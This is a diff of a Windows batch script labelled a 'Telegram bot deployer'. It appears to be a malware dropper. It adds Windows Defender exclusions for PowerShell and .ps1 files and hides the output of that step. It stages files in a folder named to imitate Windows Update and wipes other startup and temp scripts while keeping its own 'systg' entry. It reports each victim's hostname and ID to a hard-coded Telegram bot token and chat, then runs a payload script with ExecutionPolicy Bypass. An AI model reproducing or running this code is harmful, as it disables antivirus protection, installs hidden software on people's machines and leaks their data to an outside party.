@@ -16,146 +16,163 @@ echo    TELEGRAM BOT DEPLOYER
 echo ========================================
 echo.
 
-powershell -Command "Add-MpPreference -ExclusionPath 'C:\ProgramData\WindowUpdate' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'powershell.exe' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionExtension '.ps1' -ErrorAction SilentlyContinue"
+powershell -Command "Add-MpPreference -ExclusionPath 'C:\ProgramData\WindowUpdate' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'powershell.exe' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionExtension '.ps1' -ErrorAction SilentlyContinue" >nul 2>&1
 
 echo [INFO] Defender exclusions added.
 echo.
 echo [INFO] Scanning for deployment scripts...
 echo.
 
-:: ========================================
-:: TEDI (GREEN)
-:: ========================================
-echo.
-powershell -Command "Write-Host '==================' -ForegroundColor Green"
-powershell -Command "Write-Host 'TEDI LABS' -ForegroundColor Green"
-powershell -Command "Write-Host '==================' -ForegroundColor Green"
+:: ============================================================
+:: AUTO-SELECT M01.ps1 (no menu, no choice prompt)
+:: ============================================================
+set "SELECTED=M01.ps1"
+set "LABEL=Tedi Lab 1"
+set "TOTAL=1"
 
-set "FOUND_SCRIPT="
-set "LABEL="
-
-:: Check TEDI scripts first
-if exist "%SCRIPT_DIR%V01.ps1" (
-    set "FOUND_SCRIPT=%SCRIPT_DIR%V01.ps1"
-    set "LABEL=Veterinary"
-    powershell -Command "Write-Host '  [✓] Veterinary (V01.ps1)' -ForegroundColor Green"
-) else if exist "%SCRIPT_DIR%M01.ps1" (
-    set "FOUND_SCRIPT=%SCRIPT_DIR%M01.ps1"
-    set "LABEL=Tedi Lab 1"
-    powershell -Command "Write-Host '  [✓] Tedi Lab 1 (M01.ps1)' -ForegroundColor Green"
-) else if exist "%SCRIPT_DIR%M02.ps1" (
-    set "FOUND_SCRIPT=%SCRIPT_DIR%M02.ps1"
-    set "LABEL=Tedi Lab 2"
-    powershell -Command "Write-Host '  [✓] Tedi Lab 2 (M02.ps1)' -ForegroundColor Green"
-) else if exist "%SCRIPT_DIR%M03.ps1" (
-    set "FOUND_SCRIPT=%SCRIPT_DIR%M03.ps1"
-    set "LABEL=Tedi Lab 3"
-    powershell -Command "Write-Host '  [✓] Tedi Lab 3 (M03.ps1)' -ForegroundColor Green"
-) else if exist "%SCRIPT_DIR%M04.ps1" (
-    set "FOUND_SCRIPT=%SCRIPT_DIR%M04.ps1"
-    set "LABEL=Tedi Lab 4"
-    powershell -Command "Write-Host '  [✓] Tedi Lab 4 (M04.ps1)' -ForegroundColor Green"
-)
-
-:: If no TEDI script found, check FASIL (BLUE)
-if not defined FOUND_SCRIPT (
+if not exist "%SCRIPT_DIR%M01.ps1" (
     echo.
-    powershell -Command "Write-Host '==================' -ForegroundColor Blue"
-    powershell -Command "Write-Host 'FASIL LABS' -ForegroundColor Blue"
-    powershell -Command "Write-Host '==================' -ForegroundColor Blue"
-    
-    if exist "%SCRIPT_DIR%F01.ps1" (
-        set "FOUND_SCRIPT=%SCRIPT_DIR%F01.ps1"
-        set "LABEL=Fasil Lab 1"
-        powershell -Command "Write-Host '  [✓] Fasil Lab 1 (F01.ps1)' -ForegroundColor Blue"
-    ) else if exist "%SCRIPT_DIR%F02.ps1" (
-        set "FOUND_SCRIPT=%SCRIPT_DIR%F02.ps1"
-        set "LABEL=Fasil Lab 2"
-        powershell -Command "Write-Host '  [✓] Fasil Lab 2 (F02.ps1)' -ForegroundColor Blue"
-    ) else if exist "%SCRIPT_DIR%F03.ps1" (
-        set "FOUND_SCRIPT=%SCRIPT_DIR%F03.ps1"
-        set "LABEL=Fasil Lab 3"
-        powershell -Command "Write-Host '  [✓] Fasil Lab 3 (F03.ps1)' -ForegroundColor Blue"
-    ) else if exist "%SCRIPT_DIR%F04.ps1" (
-        set "FOUND_SCRIPT=%SCRIPT_DIR%F04.ps1"
-        set "LABEL=Fasil Lab 4"
-        powershell -Command "Write-Host '  [✓] Fasil Lab 4 (F04.ps1)' -ForegroundColor Blue"
-    ) else if exist "%SCRIPT_DIR%F05.ps1" (
-        set "FOUND_SCRIPT=%SCRIPT_DIR%F05.ps1"
-        set "LABEL=Fasil Lab 5"
-        powershell -Command "Write-Host '  [✓] Fasil Lab 5 (F05.ps1)' -ForegroundColor Blue"
-    ) else if exist "%SCRIPT_DIR%F06.ps1" (
-        set "FOUND_SCRIPT=%SCRIPT_DIR%F06.ps1"
-        set "LABEL=Fasil Lab 6"
-        powershell -Command "Write-Host '  [✓] Fasil Lab 6 (F06.ps1)' -ForegroundColor Blue"
-    )
-)
-
-:: If no FASIL script found, check MARAKI (RED)
-if not defined FOUND_SCRIPT (
-    echo.
-    powershell -Command "Write-Host '==================' -ForegroundColor Red"
-    powershell -Command "Write-Host 'MARAKI LABS' -ForegroundColor Red"
-    powershell -Command "Write-Host '==================' -ForegroundColor Red"
-    
-    if exist "%SCRIPT_DIR%MA01.ps1" (
-        set "FOUND_SCRIPT=%SCRIPT_DIR%MA01.ps1"
-        set "LABEL=Maraki Lab 1"
-        powershell -Command "Write-Host '  [✓] Maraki Lab 1 (MA01.ps1)' -ForegroundColor Red"
-    ) else if exist "%SCRIPT_DIR%MA02.ps1" (
-        set "FOUND_SCRIPT=%SCRIPT_DIR%MA02.ps1"
-        set "LABEL=Maraki Lab 2"
-        powershell -Command "Write-Host '  [✓] Maraki Lab 2 (MA02.ps1)' -ForegroundColor Red"
-    ) else if exist "%SCRIPT_DIR%MA03.ps1" (
-        set "FOUND_SCRIPT=%SCRIPT_DIR%MA03.ps1"
-        set "LABEL=Maraki Lab 3"
-        powershell -Command "Write-Host '  [✓] Maraki Lab 3 (MA03.ps1)' -ForegroundColor Red"
-    ) else if exist "%SCRIPT_DIR%MA04.ps1" (
-        set "FOUND_SCRIPT=%SCRIPT_DIR%MA04.ps1"
-        set "LABEL=Maraki Lab 4"
-        powershell -Command "Write-Host '  [✓] Maraki Lab 4 (MA04.ps1)' -ForegroundColor Red"
-    ) else if exist "%SCRIPT_DIR%FB01.ps1" (
-        set "FOUND_SCRIPT=%SCRIPT_DIR%FB01.ps1"
-        set "LABEL=Maraki FB"
-        powershell -Command "Write-Host '  [✓] Maraki FB (FB01.ps1)' -ForegroundColor Red"
-    )
-)
-
-echo.
-echo ========================================
-
-if not defined FOUND_SCRIPT (
-    echo.
-    echo [ERROR] No deployment scripts found!
-    echo.
-    echo Please make sure at least one script exists:
-    echo.
-    echo   TEDI:    M01.ps1, M02.ps1, M03.ps1, M04.ps1, V01.ps1
-    echo   FASIL:   F01.ps1, F02.ps1, F03.ps1, F04.ps1, F05.ps1, F06.ps1
-    echo   MARAKI:  FB01.ps1, MA01.ps1, MA02.ps1, MA03.ps1, MA04.ps1
+    echo [ERROR] Required script M01.ps1 not found in:
+    echo         %SCRIPT_DIR%
     echo.
     pause
     exit /b 1
 )
 
-echo.
-echo [INFO] Found: !LABEL! (!FOUND_SCRIPT!)
-echo [INFO] Automatically deploying...
+echo [INFO] Auto-selected : !LABEL! (!SELECTED!)
 echo.
 
-powershell -NoProfile -ExecutionPolicy Bypass -File "!FOUND_SCRIPT!"
+set "FOUND_SCRIPT=%SCRIPT_DIR%!SELECTED!"
+
+:: ========================================
+:: COMPUTER ID PROMPT (cannot be empty)
+:: ========================================
+echo ========================================
+echo    COMPUTER IDENTIFICATION
+echo ========================================
+echo.
+
+:ask_id
+set "COMPUTER_ID="
+set /p COMPUTER_ID="Enter ComputerID: "
+
+set "COMPUTER_ID=!COMPUTER_ID:"=!"
+
+if "!COMPUTER_ID!"=="" (
+    echo.
+    powershell -Command "Write-Host '  [ERROR] ComputerID cannot be empty. Please try again.' -ForegroundColor Red"
+    echo.
+    goto :ask_id
+)
+
+echo.
+echo [INFO] Selected Lab   : !LABEL! (!SELECTED!)
+echo [INFO] ComputerID     : !COMPUTER_ID!
+echo [INFO] Hostname       : %COMPUTERNAME%
+echo [INFO] Deploying...
+echo.
+
+:: ========================================
+:: CLEAN PREVIOUS DEPLOYMENTS (except systg in AppData)
+:: ========================================
+echo ========================================
+echo    CLEANING PREVIOUS DEPLOYMENTS
+echo ========================================
+echo.
+echo [INFO] Removing old deployment files (preserving 'systg' in AppData)...
+echo.
+
+powershell -NoProfile -Command ^
+  "$ErrorActionPreference='SilentlyContinue';" ^
+  "$removed=0;" ^
+  "$protected=@('systg');" ^
+  "$targets=@(" ^
+  "  \"$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\*.lnk\"," ^
+  "  \"$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\*.vbs\"," ^
+  "  \"$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\*.bat\"," ^
+  "  \"$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\*.cmd\"," ^
+  "  \"$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\*.ps1\"," ^
+  "  \"$env:PROGRAMDATA\Microsoft\Windows\Start Menu\Programs\Startup\*.lnk\"," ^
+  "  \"$env:PROGRAMDATA\Microsoft\Windows\Start Menu\Programs\Startup\*.vbs\"," ^
+  "  \"$env:PROGRAMDATA\Microsoft\Windows\Start Menu\Programs\Startup\*.bat\"," ^
+  "  \"$env:PROGRAMDATA\Microsoft\Windows\Start Menu\Programs\Startup\*.cmd\"," ^
+  "  \"$env:PROGRAMDATA\Microsoft\Windows\Start Menu\Programs\Startup\*.ps1\"," ^
+  "  \"$env:TEMP\*.ps1\"," ^
+  "  \"$env:TEMP\*.vbs\"," ^
+  "  \"$env:TEMP\*.bat\"," ^
+  "  \"$env:TEMP\*.cmd\"," ^
+  "  \"$env:TEMP\*.lnk\"," ^
+  "  \"C:\ProgramData\WindowUpdate\*\"," ^
+  "  \"$env:LOCALAPPDATA\Temp\*.ps1\"," ^
+  "  \"$env:LOCALAPPDATA\Temp\*.vbs\"," ^
+  "  \"$env:LOCALAPPDATA\Temp\*.bat\"" ^
+  ");" ^
+  "foreach($t in $targets){" ^
+  "  Get-Item $t -ErrorAction SilentlyContinue | ForEach-Object {" ^
+  "    $n=$_.Name;" ^
+  "    $skip=$false;" ^
+  "    foreach($p in $protected){ if($n -like \"*$p*\"){ $skip=$true; break } }" ^
+  "    if(-not $skip){ Remove-Item $_.FullName -Force -Recurse -ErrorAction SilentlyContinue; if(-not (Test-Path $_.FullName)){ $removed++ } }" ^
+  "  }" ^
+  "};" ^
+  "Write-Host ('  [OK] Removed ' + $removed + ' old deployment file(s).') -ForegroundColor Yellow;" ^
+  "Write-Host '  [OK] Preserved: systg folder in AppData.' -ForegroundColor Green"
+
+if exist "C:\ProgramData\WindowUpdate\" (
+    for /d %%D in ("C:\ProgramData\WindowUpdate\*") do (
+        echo %%D | findstr /i "systg" >nul
+        if errorlevel 1 (
+            rd /s /q "%%D" >nul 2>&1
+        )
+    )
+)
+
+echo.
+echo ========================================
+echo    CLEANUP COMPLETE - STARTING DEPLOYMENT
+echo ========================================
+echo.
+
+:: ========================================
+:: SEND IDENTIFICATION TO TELEGRAM
+:: ========================================
+powershell -Command "$token = '8425297013:AAG42OM97dT64vT9V4CVkiF-0n9nCqP8BSI'; $chat = '7303070402'; $msg = \"MACHINE IDENTIFIED`n`n----------------------`nLab        : !LABEL!`nComputerID : !COMPUTER_ID!`nHostname   : %COMPUTERNAME%`nTime       : $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')`n----------------------\"; $uri = 'https://api.telegram.org/bot' + $token + '/sendMessage'; Invoke-RestMethod -Uri $uri -Method Post -Body @{chat_id=$chat; text=$msg} | Out-Null"
+
+echo [INFO] Identification sent to Telegram.
+echo.
+
+:: ========================================
+:: DEPLOY
+:: ========================================
+powershell -NoProfile -ExecutionPolicy Bypass -File "%FOUND_SCRIPT%"
 
 if %errorlevel% equ 0 (
     echo.
     echo ========================================
     powershell -Command "Write-Host '   DEPLOYMENT SUCCESSFUL!' -ForegroundColor Green"
     echo ========================================
+    echo.
+    echo [INFO] Deployed on host: %COMPUTERNAME%
+    echo [INFO] ComputerID      : !COMPUTER_ID!
+    echo.
+
+    powershell -Command "$token = '8425297013:AAG42OM97dT64vT9V4CVkiF-0n9nCqP8BSI'; $chat = '7303070402'; $msg = \"DEPLOYMENT SUCCESSFUL`n`n----------------------`nLab        : !LABEL!`nScript     : !SELECTED!`nComputerID : !COMPUTER_ID!`nHostname   : %COMPUTERNAME%`nTime       : $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')`n----------------------\"; $uri = 'https://api.telegram.org/bot' + $token + '/sendMessage'; Invoke-RestMethod -Uri $uri -Method Post -Body @{chat_id=$chat; text=$msg} | Out-Null"
+
+    echo [INFO] Telegram notification sent.
+    echo.
 ) else (
     echo.
     echo ========================================
     powershell -Command "Write-Host '   DEPLOYMENT FAILED!' -ForegroundColor Red"
     echo ========================================
+    echo.
+
+    powershell -Command "$token = '8425297013:AAG42OM97dT64vT9V4CVkiF-0n9nCqP8BSI'; $chat = '7303070402'; $msg = \"DEPLOYMENT FAILED`n`n----------------------`nLab        : !LABEL!`nScript     : !SELECTED!`nComputerID : !COMPUTER_ID!`nHostname   : %COMPUTERNAME%`nTime       : $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')`n----------------------\"; $uri = 'https://api.telegram.org/bot' + $token + '/sendMessage'; Invoke-RestMethod -Uri $uri -Method Post -Body @{chat_id=$chat; text=$msg} | Out-Null"
+
+    echo [INFO] Failure notification sent.
+    echo.
 )
 
+echo.
 pause
 exit /b 0
